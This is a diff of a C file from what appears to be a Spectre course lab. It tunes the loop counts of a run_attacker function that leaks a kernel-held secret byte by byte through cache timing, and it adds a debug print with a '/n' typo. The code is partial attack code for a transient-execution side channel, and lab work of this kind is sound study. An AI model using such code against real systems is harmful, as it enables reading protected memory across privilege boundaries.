@@ -74,11 +74,11 @@ int run_attacker(int kernel_fd, char *shared_memory) {
 
     for (current_offset = 0; current_offset < SHD_SPECTRE_LAB_SECRET_MAX_LEN; current_offset++) {
         int hist[256] = {0};
-        for (int i = 0; i < 1; i++)
+        for (int i = 0; i < 15; i++)
         {
             char leaked_byte;
             int min = 100000;
-            for (size_t i = 0; i < 17000 ; i++) //fool BP -in part 2.4 we need to change max(i) //rand max i?
+            for (size_t i = 0; i < 1024 ; i++) //fool BP -in part 2.4 we need to change max(i) //rand max i?
             { 
                 mfence();
                 flush_cache();
@@ -105,6 +105,7 @@ int run_attacker(int kernel_fd, char *shared_memory) {
         // leaked_byte = ??
 
         leaked_str[current_offset] = max_idx(hist, 256);
+        fprintf(stderr, "%c/n", leaked_str[current_offset]);
         if (max_idx(hist , 256) == 0) {//'\0'
             break;
         }
